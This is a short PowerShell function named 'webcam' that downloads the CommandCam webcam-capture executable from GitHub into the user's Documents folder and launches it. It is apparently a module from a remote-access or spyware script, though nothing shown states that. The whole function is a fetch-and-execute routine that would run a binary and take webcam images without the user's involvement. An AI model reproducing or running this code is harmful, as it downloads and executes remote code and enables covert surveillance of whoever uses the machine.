function webcam {
    # gute nacht
    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath
    Start-Sleep -Seconds 5
    Start-Process $outpath
}
